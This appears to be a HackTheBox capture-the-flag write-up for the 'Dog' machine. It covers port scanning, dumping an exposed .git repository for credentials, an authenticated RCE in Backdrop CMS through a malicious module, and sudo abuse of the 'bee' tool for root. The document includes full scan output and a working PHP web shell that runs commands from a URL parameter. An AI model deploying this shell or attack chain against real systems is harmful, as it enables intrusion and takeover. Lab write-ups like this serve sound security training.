-----------

### CTF-: HACKTHEBOX
### LAB-: Dog

------------

![image](https://github.com/user-attachments/assets/2ab9b774-1727-487c-95ce-82156d28de0f)

-------------

- Rustscan's output-:

```bash
❯ rustscan -a dog.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.58:22
Open 10.10.11.58:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-14 09:22 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
Initiating Connect Scan at 09:22
Scanning dog.htb (10.10.11.58) [2 ports]
Discovered open port 22/tcp on 10.10.11.58
Discovered open port 80/tcp on 10.10.11.58
Completed Connect Scan at 09:22, 0.19s elapsed (2 total ports)
Initiating Service scan at 09:22
Scanning 2 services on dog.htb (10.10.11.58)
Completed Service scan at 09:22, 6.65s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.58.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:22
Completed NSE at 09:22, 8.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:22
Completed NSE at 09:22, 1.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:22
Completed NSE at 09:22, 0.00s elapsed
Nmap scan report for dog.htb (10.10.11.58)
Host is up, received user-set (0.19s latency).
Scanned at 2025-03-14 09:22:08 WAT for 16s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I discovered a `.git` folder with `ffuf`.

![image](https://github.com/user-attachments/assets/a59b1f33-81e8-43a1-a1da-ed9cbe99fcd8)

- I dumped the `.git` directory with `GITTOOLS` to check for credentials.

![image](https://github.com/user-attachments/assets/fbabd504-1eec-4075-99cb-1f2b2e5ab97f)

- And extracted it with `extractor.sh`

![image](https://github.com/user-attachments/assets/535000f6-c15b-4bd1-b159-e49e157e698f)

- I found this email in the objects after grepping for `dog.htb`.

![image](https://github.com/user-attachments/assets/20ea2bc2-b079-451c-87ba-56b15365a874)

- Then,after checking file `settings.php`, I noticed this credential.

![image](https://github.com/user-attachments/assets/1bdc1851-7557-450a-aca4-164bee511752)

- I was able to login to the admin dashboard.

![image](https://github.com/user-attachments/assets/f8193d68-d6a8-4dcc-bc0c-26f4e478361a)

- This version of Backdoor CMS is vulnerable to [authenticated Remote Code Execution](https://www.exploit-db.com/exploits/52021) as explained here.In this target's case, zip files are not allowed, only tar,gz and bz2 archives are allowed.

![image](https://github.com/user-attachments/assets/e4458640-42be-467e-acef-ce7c013dfd4b)

-------------

### Creating an exploit

-------------

- I created a directory named `sensei` containing the info file and a php file containing the malicious code.

![image](https://github.com/user-attachments/assets/3db5340d-5a13-4e0a-b1d5-5f1570970d29)

- sensei.info content-:

```info
type = module
name = sensei
description = Controls the visual building blocks a page is constructedwith. Blocks are boxes of content rendered into an area, or region, of aweb page.
package = Layouts
tags[] = Sensei
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x

configure = admin/structure/block

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```
- Php shell-:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
</pre>
</body>
</html>
```

- Then, create a tar.gz file with `tar -czf <example.tar.gz> <directory +or +file>`

![image](https://github.com/user-attachments/assets/f455729f-5602-4f6a-8354-4ad4f35aa48e)

- Upload it and install, shell should be at `<url>/modules/sensei/sensei.php`

![image](https://github.com/user-attachments/assets/b70161f5-5d5f-46de-99f7-60cbe163962b)

- Shell-:

![image](https://github.com/user-attachments/assets/d5d90f27-98ea-4774-80d8-537960e1cc13)


- I grepped for users from `/etc/passwd` and discovered 2 users.

![image](https://github.com/user-attachments/assets/e2385ba7-75f3-4ce6-a99b-915c1945c48f)

- I tried the password for `tiffany@dog.htb` and was able to access user `johncusack`.

![image](https://github.com/user-attachments/assets/7c3772ff-966b-45c3-b861-3f5482f7cbae)


-------------

### Privesc with backdrop-bee

-------------

- After running `sudo -l`,I noticed that user `johncusack` can run a binary `bee` as root.

![image](https://github.com/user-attachments/assets/7cea4d6a-7005-4762-8566-e12983261845)

- I checked the manual for the binary and noticed that bee is the cli tool for backdrop CMS and can be used to run php code and scripts.

![image](https://github.com/user-attachments/assets/6ecef023-27f4-44c4-829a-4b52a2be2818)

- I noticed this error when I tried to execute code.

![image](https://github.com/user-attachments/assets/ff7f6d42-efc2-4aa4-bd8d-947609ced55e)

- Bee gets bootstrapped if you run it in the valid directory that `Backdoor CMS` is installed which is in `/var/www/html`.

![image](https://github.com/user-attachments/assets/bccd58a5-8d1b-4fb0-96a6-84ef3f41b169)

- I spawned a root reverse shell.

![image](https://github.com/user-attachments/assets/08cb2bd8-0b57-4057-84ba-f369c09cd56b)

- Root shell-:

![image](https://github.com/user-attachments/assets/a4abff9c-c4d8-419e-9631-1d44c55ecc72)

--------------

### THANKS FOR READING!!!!

---------------

### REFERENCES-:

---------------

- [Backdoor CMS exploit](https://www.exploit-db.com/exploits/52021)

---------------
























